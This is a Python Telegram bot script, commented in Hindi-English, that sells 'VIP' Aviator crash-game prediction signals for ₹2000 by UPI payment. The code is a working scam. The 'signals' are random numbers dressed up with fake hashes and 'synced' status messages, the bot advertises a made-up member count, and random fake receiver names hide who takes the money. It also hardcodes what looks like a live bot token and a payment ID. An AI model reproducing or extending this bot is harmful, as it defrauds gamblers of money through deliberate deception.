import telebot, random, time, hashlib, urllib.parse
from telebot import types

# --- 🔐 CONFIGURATION ---
# Aapka Bot Token aur UPI details
BOT_TOKEN = "8402941434:AAFpbeqcIZU5HTeVxxnzjk5XCnyGwgLrzhk"
OWNER_ID = 8188755760 
REAL_UPI = "swatantrsingh42@okhdfcbank"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# Identity Hide karne ke liye fake names
FAKE_NAMES = ["Raj Kumar", "Amit Singh", "Aviator Predictor", "1Win Official", "Vipin Kumar"]

def get_hash(): 
    return hashlib.sha256(str(time.time()).encode()).hexdigest()[:12].upper()

# --- 🏠 START HANDLER ---
@bot.message_handler(commands=["start"])
def start(message):
    # Bio sync logic
    try: bot.set_my_description(f"🟢 SERVER LIVE | 🛰️ SEED: {get_hash()} | 👥 15,420+ Members")
    except: pass
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💰 VIP Plan ₹2000 ✅", callback_data="buy_2000"),
        types.InlineKeyboardButton("🚀 GET NEXT SIGNAL", callback_data="signal")
    )
    welcome_msg = (
        f"🤖 **AVIATOR PREMIUM V10**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 **Status:** Connected\n"
        f"🛰️ **Seed:** `{get_hash()}`\n\n"
        "Signals ke liye VIP plan lein ya niche click karein:"
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup)

# --- 💳 PAYMENT PROCESS ---
@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
def pay(call):
    amt = call.data.split("_")[1]
    name = random.choice(FAKE_NAMES)
    # UPI Link generation
    link = f"upi://pay?pa={REAL_UPI}&pn={name}&am={amt}&cu=INR"
    qr = f"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={urllib.parse.quote(link)}"
    
    caption = (
        f"💳 **PAYMENT INVOICE**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Receiver:** `{name}`\n"
        f"💰 **Amount:** ₹{amt}\n\n"
        "✅ Scan karke pay karein aur **12-digit UTR** yahan bhein."
    )
    bot.send_photo(call.message.chat.id, qr, caption=caption)

# --- 🛡️ UTR VERIFICATION ---
@bot.message_handler(func=lambda m: len(m.text) == 12 and m.text.isdigit())
def utr(message):
    # Admin approval alert
    uid = message.chat.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Approve ✅", callback_data=f"ok_{uid}"))
    bot.send_message(OWNER_ID, f"💰 **NEW PAYMENT!**\nUTR: `{message.text}`\nUser: @{message.from_user.username}", reply_markup=markup)
    bot.send_message(uid, "📡 **Verifying Payment...**\nAdmin approval ka intezar karein.")

@bot.callback_query_handler(func=lambda c: c.data.startswith("ok_"))
def approve(call):
    user_id = call.data.split("_")[1]
    bot.send_message(user_id, "✅ **Verified!** VIP Signals unlocked.")
    bot.answer_callback_query(call.id, "User Approved!")

# --- 🚀 SIGNAL LOGIC ---
@bot.callback_query_handler(func=lambda c: c.data == "signal")
def get_sig(call):
    val = round(random.uniform(1.30, 15.50), 2)
    bot.answer_callback_query(call.id, "🛰️ Syncing with Server...")
    bot.send_message(call.message.chat.id, f"🚀 **SIGNAL: {val}x**\n🛰️ **HASH:** `{get_hash()}`\n🟢 **STATUS: SYNCED**")

bot.infinity_polling()
